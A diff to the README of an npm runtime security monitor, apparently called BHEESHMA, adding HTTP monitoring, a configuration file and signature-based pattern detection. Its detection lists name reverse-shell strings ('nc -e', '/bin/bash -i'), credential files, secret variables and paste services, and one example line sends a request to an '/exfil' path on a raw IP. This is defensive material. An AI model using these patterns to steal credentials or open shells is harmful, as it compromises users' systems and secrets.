@@ -40,6 +40,7 @@ BHEESHMA is a **runtime behavioral security system** that monitors third-party n
 | **File System Reads** | Low-Medium | Reconnaissance, credential file access |
 | **File System Writes** | High | Persistence mechanisms, data exfiltration |
 | **Network Connections** | Medium-High | Data exfiltration, C&C communication |
+| **HTTP/HTTPS Requests** | Medium-High | Data exfiltration, suspicious service communication |
 | **Shell Execution** | Critical | Arbitrary code execution, system compromise |
 
 For each behavior, BHEESHMA captures:
@@ -100,10 +101,12 @@ bheeshma -- npm test
 
 ### Programmatic API
 
+#### Basic Usage
+
 ```javascript
 const bheeshma = require('bheeshma');
 
-// Initialize monitoring
+// Initialize monitoring with default settings
 bheeshma.init();
 
 // Your application code runs here...
@@ -118,7 +121,85 @@ const scores = bheeshma.getTrustScores();
 const signals = bheeshma.getSignals();
 ```
 
-Convenience wrapper:
+#### Advanced Configuration
+
+```javascript
+// Initialize with custom configuration
+bheeshma.init({
+  config: {
+    hooks: {
+      http: true,  // Enable HTTP monitoring
+      fs: true,    // Enable file system monitoring
+      net: true,
+      env: true,
+      childProcess: true
+    },
+    riskWeights: {
+      SHELL_EXEC: 25,      // Custom risk weight
+      HTTP_REQUEST: 10
+    },
+    patterns: {
+      enabled: true,
+      detectCryptoMiners: true,
+      detectDataExfiltration: true,
+      detectBackdoors: true
+    },
+    whitelist: ["express@*"]  // Trusted packages
+  }
+});
+```
+
+#### Using Configuration Files
+
+Create `.bheeshmarc.json` in your project root:
+
+```json
+{
+  "hooks": {
+    "http": true,
+    "fs": true
+  },
+  "riskWeights": {
+    "SHELL_EXEC": 25
+  },
+  "patterns": {
+    "enabled": true
+  },
+  "whitelist": ["express@*"]
+}
+```
+
+Then simply:
+
+```javascript
+bheeshma.init();  // Auto-loads .bheeshmarc.json
+```
+
+#### Pattern Detection
+
+```javascript
+const bheeshma = require('bheeshma');
+const { analyzePatterns } = require('bheeshma/src/patterns/patternMatcher');
+
+bheeshma.init({ config: { patterns: { enabled: true } } });
+
+// Run your app
+require('./your-app');
+
+// Analyze for malicious patterns
+const signals = bheeshma.getSignals();
+const threats = analyzePatterns(signals, {
+  enabled: true,
+  detectCryptoMiners: true,
+  detectDataExfiltration: true,
+  detectBackdoors: true
+});
+
+console.log(`Detected ${threats.summary.totalThreats} threats`);
+console.log(`Highest severity: ${threats.summary.highestSeverity}`);
+```
+
+#### Convenience Wrapper
 
 ```javascript
 const bheeshma = require('bheeshma');
@@ -226,7 +307,110 @@ BHEESHMA is built with **security-first engineering principles**:
 - ✅ **Metadata only** - Captures operation types and paths, never content
 - ✅ **No secret capture** - Environment variable names only, never values
 - ✅ **Sanitized commands** - Shell commands are redacted for common secrets
-- ✅ **No body inspection** - Network requests logged by metadata (host/port), never headers or payloads
+- ✅ **Sanitized headers** - HTTP headers are logged as [PRESENT] or [REDACTED], never full values
+- ✅ **No body inspection** - Network payloads are never captured
+
+---
+
+## Advanced Features
+
+### 🎯 Pattern Detection
+
+BHEESHMA includes signature-based detection for common supply chain attack patterns:
+
+#### Cryptocurrency Miners
+- Detects known miner processes (xmrig, ethminer, cpuminer)
+- Identifies mining pool connections
+- Flags mining-related environment variables
+
+#### Data Exfiltration
+- Monitors access to sensitive files (`.npmrc`, `.env`, `.aws/credentials`, SSH keys)
+- Detects connections to paste services (pastebin, webhook.site)
+- **Correlation analysis**: Flags packages that read sensitive files AND make HTTP requests
+
+#### Backdoors
+- Identifies reverse shell patterns (`nc -e`, `/bin/bash -i`)
+- Detects suspicious listening ports (1337, 4444, 31337)
+- Flags remote access tools (ngrok, localtunnel)
+
+#### Credential Theft
+- Monitors access to secret environment variables (`AWS_ACCESS_KEY_ID`, `NPM_TOKEN`)
+- Tracks reads of credential files
+
+### 🌐 HTTP/HTTPS Monitoring
+
+BHEESHMA intercepts all HTTP/HTTPS requests to detect:
+- ✅ Direct IP address requests (bypassing DNS)
+- ✅ Suspicious TLDs (.tk, .ml, .ga, .cf, .gq)
+- ✅ Non-standard ports
+- ✅ Pastebin-like services
+
+**Example**:
+```javascript
+// Malicious package makes request
+http.request('http://192.168.1.100:8080/exfil');
+
+// BHEESHMA detects:
+// - HTTP_REQUEST signal
+// - isIpAddress: true
+// - indicators: ["Direct IP request", "Non-standard port: 8080"]
+```
+
+### ⚙️ Configuration System
+
+Customize BHEESHMA behavior without modifying code:
+
+**Auto-discovery**: Place `.bheeshmarc.json` in your project root  
+**Validation**: All config is validated to prevent malicious configurations  
+**Flexible**: Enable/disable hooks, customize risk weights, whitelist packages
+
+**Full Configuration Example**:
+```json
+{
+  "hooks": {
+    "env": true,
+    "fs": true,
+    "net": true,
+    "childProcess": true,
+    "http": true
+  },
+  "riskWeights": {
+    "SHELL_EXEC": 20,
+    "FS_WRITE": 10,
+    "HTTP_REQUEST": 10,
+    "HTTPS_REQUEST": 8,
+    "NET_CONNECT": 8,
+    "ENV_ACCESS": 5,
+    "FS_READ": 3
+  },
+  "thresholds": {
+    "critical": 30,
+    "high": 60,
+    "medium": 80
+  },
+  "whitelist": [
+    "express@*",
+    "@types/*"
+  ],
+  "blacklist": [],
+  "patterns": {
+    "enabled": true,
+    "detectCryptoMiners": true,
+    "detectDataExfiltration": true,
+    "detectBackdoors": true,
+    "detectObfuscation": true
+  },
+  "performance": {
+    "track": false,
+    "maxSignals": 10000
+  },
+  "output": {
+    "formats": ["cli"],
+    "verbosity": "normal",
+    "includeStackTraces": true
+  }
+}
+```
 
 ---
 
@@ -262,6 +446,17 @@ BHEESHMA follows a **layered security architecture**:
 ┌─────────────────────────────────────────────────┐
 │           Runtime Hooks                          │
 │   (env, fs, net, http, https, child_process)   │
+└─────────────────────────────────────────────────┘
+                        │
+┌─────────────────────────────────────────────────┐
+│        Pattern Detection Engine                  │
+│   (Crypto Miners, Data Exfiltration,           │
+│     Backdoors, Credential Theft)                 │
+└─────────────────────────────────────────────────┘
+                        │
+┌─────────────────────────────────────────────────┐
+│          Configuration System                    │
+│        (.bheeshmarc.json loader)                │
 └─────────────────────────────────────────────────┘
 ```
 
@@ -329,13 +524,21 @@ BHEESHMA **cannot detect**:
 
 ## Roadmap
 
+Completed:
+- [x] Configuration system with validation
+- [x] HTTP/HTTPS request monitoring
+- [x] Advanced pattern detection (crypto miners, backdoors, data exfiltration)
+- [x] Malware signature database
+
 Future enhancements:
+- [ ] HTML report generation
+- [ ] Whitelist/blacklist enforcement
 - [ ] ESM (ES Modules) full support
 - [ ] Worker thread monitoring
 - [ ] DNS query monitoring
 - [ ] Crypto operation monitoring
-- [ ] Configurable risk weights
 - [ ] Policy enforcement mode (block high-risk packages)
+- [ ] Real-time alerts (webhooks, Slack)
 - [ ] Integration with popular CI/CD platforms
 
 ---
